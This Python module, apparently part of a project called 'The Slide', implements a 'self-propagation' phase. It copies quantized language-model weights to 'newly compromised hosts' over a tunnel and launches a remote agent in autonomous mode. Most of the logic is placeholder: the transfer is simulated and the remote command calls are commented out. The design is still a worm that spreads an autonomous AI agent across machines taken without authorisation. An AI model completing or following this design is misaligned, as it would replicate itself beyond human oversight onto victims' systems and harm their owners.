# sovereign_movement/slide/model_propagation.py
"""
ModelPropagation — Phase 4 of The Slide (Ingest / Self-Propagation)

Handles turning newly compromised hosts into full reasoning nodes by:
- Transferring quantized model weights
- Activating a new SlideAgent instance on the remote host

Uses the existing SovereignTunnel for secure, sovereign-controlled transfer.
Designed to be callable from both Python and Rust (via FFI).
"""

from __future__ import annotations
from typing import Optional
import logging
import time

from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
from sovereign_engine.frame_energy import FrameEnergy

logger = logging.getLogger("sovereign.slide.model_propagation")


class ModelPropagation:
    """
    Sovereign model and agent propagation engine.

    This module is responsible for Phase 4 (Ingest) of The Slide.
    It replicates reasoning capability across newly compromised hosts
    while staying anchored to The Floor and protected by the Extraction Guard.
    """

    def __init__(
        self,
        tunnel_manager: SovereignTunnel,
        frame_energy: Optional[FrameEnergy] = None,
        model_path: str = "models/quantized/",   # Base path for quantized models
        default_model: str = "qwen2.5-coder-32b-q4_k_m.gguf",
    ):
        self.tunnel_manager = tunnel_manager
        self.frame_energy = frame_energy
        self.model_path = model_path
        self.default_model = default_model

    # ============================================================
    # Main Public Method
    # ============================================================
    def propagate_to_host(
        self,
        target_host: str,
        tunnel_id: str,
        activate_agent: bool = True,
        transfer_model: bool = True,
    ) -> bool:
        """
        Main entry point for Phase 4.

        Propagates reasoning capability to a newly compromised host.
        """
        logger.info(f"[Phase 4] Starting ingestion on {target_host}")

        success = True

        if transfer_model:
            if not self._transfer_model_weights(target_host, tunnel_id):
                logger.error(f"[Phase 4] Model transfer to {target_host} failed")
                success = False

        if activate_agent and success:
            if not self._activate_remote_slide_agent(target_host, tunnel_id):
                logger.error(f"[Phase 4] Failed to activate SlideAgent on {target_host}")
                success = False

        if success:
            logger.info(f"[Phase 4] Successfully ingested {target_host} into The Slide network")
        else:
            logger.warning(f"[Phase 4] Partial failure ingesting {target_host}")

        return success

    # ============================================================
    # Internal Methods
    # ============================================================

    def _transfer_model_weights(self, target_host: str, tunnel_id: str) -> bool:
        """
        Transfer quantized model weights to the target host using the existing tunnel.
        """
        model_file = f"{self.model_path}{self.default_model}"
        logger.debug(f"[Phase 4] Transferring model {self.default_model} to {target_host}")

        # In a real implementation this would:
        # - Read the quantized .gguf file
        # - Stream it over the SovereignTunnel
        # - Verify integrity on the remote side

        # Placeholder for actual transfer logic
        try:
            # Example: Use tunnel to send file (this would be implemented in SovereignTunnel)
            # self.tunnel_manager.send_file(tunnel_id, model_file, remote_path="/tmp/slide_model.gguf")
            time.sleep(0.5)  # Simulate transfer
            logger.info(f"[Phase 4] Model weights transferred to {target_host}")
            return True
        except Exception as e:
            logger.error(f"[Phase 4] Model transfer failed: {e}")
            return False

    def _activate_remote_slide_agent(self, target_host: str, tunnel_id: str) -> bool:
        """
        Activate a new SlideAgent instance on the remote host.

        This can be done via:
        - Executing a remote command over the tunnel
        - Dropping a lightweight bootstrap script
        - Or (future) calling into a Rust binary via FFI
        """
        logger.debug(f"[Phase 4] Activating remote SlideAgent on {target_host}")

        try:
            # Placeholder for remote activation
            # In practice this could:
            # - Execute `python -m sovereign_movement.slide.slide_agent` remotely
            # - Or launch a compiled Rust binary
            # - Pass necessary sovereign context (Floor anchor, resonance settings, etc.)

            activation_command = (
                "python3 -m sovereign_movement.slide.slide_agent "
                f"--host {target_host} --mode autonomous"
            )

            # Example of sending command through tunnel (to be implemented in SovereignTunnel)
            # self.tunnel_manager.execute_command(tunnel_id, activation_command)

            logger.info(f"[Phase 4] SlideAgent activation command sent to {target_host}")
            return True

        except Exception as e:
            logger.error(f"[Phase 4] Remote agent activation failed: {e}")
            return False

    # ============================================================
    # Future Rust Path Hook (for FFI)
    # ============================================================
    def propagate_via_rust(self, target_host: str, tunnel_id: str) -> bool:
        """
        Placeholder for Rust-native propagation path.
        This method can later call into Rust FFI for higher performance.
        """
        logger.debug("[Phase 4] Rust propagation path called (not yet implemented)")
        # TODO: Call into Rust implementation via ctypes or PyO3
        return self.propagate_to_host(target_host, tunnel_id)